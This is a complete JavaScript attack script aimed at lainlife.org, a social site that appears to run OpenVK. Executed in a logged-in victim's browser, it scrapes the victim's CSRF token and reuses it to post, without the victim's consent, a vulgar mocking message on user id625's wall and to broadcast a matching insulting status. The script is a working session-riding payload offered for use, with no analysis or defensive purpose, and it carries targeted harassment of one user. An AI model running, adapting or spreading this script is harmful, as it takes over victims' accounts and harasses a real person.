async function makePost(csrf) {
  return await (await fetch("https://lainlife.org/wall625/makePost", {
      "credentials": "include",
      "headers": {
          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
          "Accept": "*/*",
          "Accept-Language": "en-US,en;q=0.5",
          "X-OpenVK-Ajax-Query": "1",
          "Content-Type": "multipart/form-data; boundary=----geckoformboundary45397845d99409e0dd4bd380e71b4b24",
          "Sec-GPC": "1",
          "Sec-Fetch-Dest": "empty",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Site": "same-origin",
          "Priority": "u=0"
      },
      "referrer": "https://lainlife.org/id625",
      "body": `------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"text\"\r\n\r\nПривет Ослоёб, я твой преданный фанат\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"horizontal_attachments\"\r\n\r\n\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"vertical_attachments\"\r\n\r\n\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"poll\"\r\n\r\nnone\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"source\"\r\n\r\nnone\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"geo\"\r\n\r\n\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\n1\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24\r\nContent-Disposition: form-data; name=\"hash\"\r\n\r\n${csrf}\r\n------geckoformboundary45397845d99409e0dd4bd380e71b4b24--\r\n`,
      "method": "POST",
      "mode": "cors"
  })).text();
}

async function getCSRF() {
  const text = await (await fetch("https://lainlife.org/id625", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Sec-GPC": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i"
    },
    "referrer": "https://lainlife.org/id625",
    "method": "GET",
    "mode": "cors"
  })).text();
  return text.split(`<meta name="csrf" value="`)[1].split(`" />`)[0]
}

async function setStatus(csrf, status) {
  await (await fetch("https://lainlife.org/edit?act=status", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "multipart/form-data; boundary=----geckoformboundary3b5c6a2f999231017c670364cec5dd97",
        "Sec-GPC": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=4"
    },
    "referrer": "https://lainlife.org/id625",
    "body": `------geckoformboundary3b5c6a2f999231017c670364cec5dd97\r\nContent-Disposition: form-data; name=\"status\"\r\n\r\n${status}\r\n------geckoformboundary3b5c6a2f999231017c670364cec5dd97\r\nContent-Disposition: form-data; name=\"broadcast\"\r\n\r\n1\r\n------geckoformboundary3b5c6a2f999231017c670364cec5dd97\r\nContent-Disposition: form-data; name=\"hash\"\r\n\r\n${csrf}\r\n------geckoformboundary3b5c6a2f999231017c670364cec5dd97--\r\n`,
    "method": "POST",
    "mode": "cors"
  })).text();
}

async function hack() {
  const csrf = await getCSRF();
  console.log('csrf', csrf);
  await makePost(csrf);
  await setStatus(csrf, 'Lets all love Donkey Fucker!!! I\'m his fan.');
};

hack();
